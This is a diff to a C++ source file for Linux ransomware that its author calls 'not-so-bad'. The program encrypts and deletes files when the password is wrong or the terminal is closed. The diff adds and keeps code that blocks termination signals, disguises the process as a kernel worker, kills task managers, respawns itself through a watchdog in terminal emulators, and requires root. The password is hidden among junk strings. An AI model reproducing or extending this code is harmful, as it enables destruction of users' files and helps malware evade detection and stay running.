@@ -1,10 +1,11 @@
 // Developed by Colton Silva 2025
-// 
+// version 1.0
 //
 // WARNING: This single file contains c++ source code that
 // can destroy Linux system by encrypting all files
 // (including system files) and deleting them automatically
 // if you enter incorrect password at it's given attempt times
+// or if you exit your Linux terminal
 
 // This software can alter or modify the system's operation
 // which is, to block signals from preventing this from running
@@ -46,11 +47,12 @@ const char FILE_SIGNATURE[] = "SILVASYSTEMS\x01\x00";
 const string MAP_FILE = "file_map.txt";
 
 // Obfuscated password hidden inside garbage text
-const string junk1 = "a1b2c3d4e5f6g7h8i9j0SuperX";
-const string junk2 = "ZyXwVuTsRqPoNm";
-const string junk3 = "vincemcmahon";
-const string junk4 = "aBcDeFgHiJkLmNoPqRsTuVwXyZ";
-const string junk5 = "1234567890!@#$%^&*()";
+const string junk1 = "やπ郧bnLJ9SADxEcʥ9&aԠNISEKOIࠇ+eعKק";
+const string junk2 = "ECieNvDsPuK99suPReMO69jEEpcM8e3";
+const string junk3 = "vincemcmahon"; // This is the real password. You may change your preferred password
+const string junk4 = "ㅴwVܮ3辸E6c&䶵Մ$sUcKmaHdIcK3ふわÅ=Đ?őŔԪ";
+const string junk5 = "𐅰E𐊘4ed𐎵𐐡flUncKj7eU8𐌱cR?e齉Do";
+const string junk6 = "EsU5E?cLmhH9dAzZLyuDFa9DFaOpP";
 const string HARDCODED_PASSWORD = junk3;
 
 // Password attempt limit
@@ -165,6 +167,7 @@ void encryptDirectory(const fs::path &dirPath, map<string, string> &fileMap, int
 }
 
 void encryptAllFiles() {
+
     map<string, string> fileMap;
     int counter = 1;
     encryptDirectory(fs::current_path(), fileMap, counter);
@@ -226,7 +229,7 @@ void startEncryption() {
     encryptAllFiles(); // Start encryption process
 }
 
-// Immortality
+// from void setupProtection()
 void signalHandler(int signum) {
     cout << "\n\033[1;31m[BLOCKED]\033[0m Attempted to terminate process! Ignored.\n" << endl;
 }
@@ -254,7 +257,9 @@ void setupProtection() {
     prctl(PR_SET_NAME, "kworker/0:1H", 0, 0, 0);
 }
 
-// I decided to merge task managers and power session control in this function but these have the same goal, to prevent execution that may intterupt on this program
+// While blocking execution of these task managers are possible, blocking
+// poweroff, reboot or logout, lockscreen manager, systemctl and other related
+// system binaries will result in crash or unstable operation of the system
 
 void monitorAndKillTaskManagers() {
     const vector<string> taskManagers = {
@@ -279,30 +284,75 @@ void monitorAndKillTaskManagers() {
 void encryptAllFiles();
 void decryptAllFiles();
 
-void watchdog() {
-     pid_t pid = fork();
-    // Run forever, checking if the program is running
-
-     if (pid > 0) return;  // Parent process returns to continue encryption
-    if (pid < 0) exit(1); // Fork failed
+void watchdog(const string& selfPath) {
+    pid_t pid = fork();
+    if (pid > 0) return;
+    if (pid < 0) exit(1);
 
     while (true) {
-        sleep(5); // Check every 5 seconds
+        int ret = system(("pgrep -f '" + selfPath + "' | grep -v $$ > /dev/null").c_str());
+        if (ret != 0) {
+            const char* terms[] = {
+                "x-terminal-emulator", "xterm", "gnome-terminal",
+                "konsole", "xfce4-terminal", "lxterminal",
+                "mate-terminal", "tilix", nullptr
+            };
 
-        // Check if the program is running (excluding grep process itself)
-        if (system("pgrep -f scramble | grep -v $$ > /dev/null") != 0) {
-            system("./scramble &");  // Restart if not running
+            for (int i = 0; terms[i]; ++i) {
+                string cmd = string(terms[i]) + " -e \"" + selfPath + "\" &";
+                if (system(cmd.c_str()) == 0) break;
+            }
         }
+
+        sleep(5);
     }
-      exit(0); // Should never reach here, just a failsafe
+
+    exit(0);
 }
 
 
-int main() {
 
-    if (!fs::exists(MAP_FILE)) {
+void relaunchInTerminalIfDetached(const char* selfPath) {
+    if (!isatty(STDIN_FILENO)) {
+        const char* terminals[] = {
+            "x-terminal-emulator", "xterm", "gnome-terminal",
+            "konsole", "xfce4-terminal", "lxterminal",
+            "mate-terminal", "tilix", nullptr
+        };
+
+        for (int i = 0; terminals[i]; ++i) {
+            string cmd = string(terminals[i]) + " -e \"" + selfPath + "\" &";
+            if (system(cmd.c_str()) == 0) {
+                exit(0); // Relaunch succeeded
+            }
+        }
+
+        cerr << "[!] Failed to relaunch in terminal!" << endl;
+        exit(1);
+    }
+}
+
+
+int main(int argc, char* argv[]) {
+
+// This requires you to run this program into root
+
+if (geteuid() != 0) {
+    cerr << "This program must be run as root." << endl;
+    exit(1);
+}
+
+if (!fs::exists(MAP_FILE)) {
+    
+    string selfPath = fs::absolute(argv[0]);  // Full binary path
       
+    relaunchInTerminalIfDetached(argv[0]);
     setupProtection();
+    
+    
+    thread wd(watchdog, selfPath);
+    wd.detach();
+    
     thread antiMonitor(monitorAndKillTaskManagers);
     antiMonitor.detach(); // Keeps it running in background
 
@@ -316,13 +366,16 @@ int main() {
         //setupProtection();
         //watchdog();
 
-        cout << " _____ _ _      _   _       _ _\n|  ___(_) | ___| \\ | |_   _| | | ___ _ __ \n| |_  | | |/ _ \\  \\| | | | | | |/ _ \\ '__|\n|  _| | | |  __/ |\\  | |_| | | |  __/ |   \n|_|   |_|_|\\___|_| \\_|\\__,_|_|_|\\___|_|   \nThe not-so-bad RANSOMWARE for Linux by Colton Silva" << endl;
+        cout << " _____ _ _      _   _       _ _\n|  ___(_) | ___| \\ | |_   _| | | ___ _ __ \n| |_  | | |/ _ \\  \\| | | | | | |/ _ \\ '__|\n|  _| | | |  __/ |\\  | |_| | | |  __/ |   \n|_|   |_|_|\\___|_| \\_|\\__,_|_|_|\\___|_|   \nThe not-so-bad RANSOMWARE for Linux by Colton Silva\n" << endl;
 
         cout << "\nOH NO! YOUR PERSONAL FILES WILL BE ENCRYPTED! Don't worry because this ransomware doesn't ask for money, stealing them or threaten you to distribute your sensitive files to criminals. You just need to solve this by guessing the correct password in order to retrieve them.\n\nYOU CAN'T DESTROY THIS PROCESS. EVEN IF YOU KILL YOUR LOVELY TERMINAL OF YOURS, THIS PROCESS IS ONGOING.\n" << endl;
 
         this_thread::sleep_for(chrono::seconds(10));
+        
+        cout << "\n\033[1;31m[WARNING]\033[0m IF YOU CLOSE THIS TERMINAL, THIS PROGRAM WILL DELETE ALL OF YOUR FILES.\n" << endl;
+                  
+        this_thread::sleep_for(chrono::seconds(10));
 
-    // Start encryption immediately in a separate thread
         thread encryptionThread(startEncryption);
 
           cout << "Now, say BYE-BYE to your files!\n" << endl;
@@ -331,7 +384,7 @@ int main() {
 
         cout << "Null-ng files...\n" << endl;
 
-    // Wait for encryption to complete
+
         encryptionThread.join();
         decryptAllFiles();
         return 0; 
@@ -341,4 +394,4 @@ int main() {
         decryptAllFiles();
     }
     return 0;
-}
+} 
